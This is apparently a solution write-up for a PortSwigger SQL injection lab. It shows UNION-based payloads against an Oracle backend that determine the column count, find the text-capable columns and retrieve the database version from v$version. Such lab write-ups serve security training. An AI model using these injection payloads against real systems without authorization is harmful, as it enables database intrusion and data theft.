## Question:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/7c102d92-7908-48b4-8fb1-15a9e672e982)

## Solution:

Determine the number of columns

caputred request

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/a9a084ad-c96e-4ff5-83cc-0bfe6751edf3)

Quary made-

`SELECT * FROM someTable WHERE category = '<CATEGORY>' ' UNION SELECT NULL,NULL FROM dual--`

Quary changed-

`SELECT * FROM someTable WHERE category = '<CATEGORY>' ' UNION SELECT NULL,NULL FROM dual--`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/5de8ac74-82d1-4ec2-9266-7fe8a2f0c415)

there are 2 columns being retreived.

Determine the column which has text data

`SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'a','b' FROM dual --`

Both the columns show the text in response. So both columns support text data.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/0d6deb45-5c1a-4a78-b51d-e9672eeae607)

Retreive db type & version of ORACLE

To retretive db type & version of ORACLE , we have the syntax `SELECT * FROM v$version`

`SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,banner FROM v$version --`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/edc89aa7-1551-417d-8afa-e4e0a751540a)

Lab Solved

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/3c78883e-c717-4ebd-8931-c886b9c866f1)


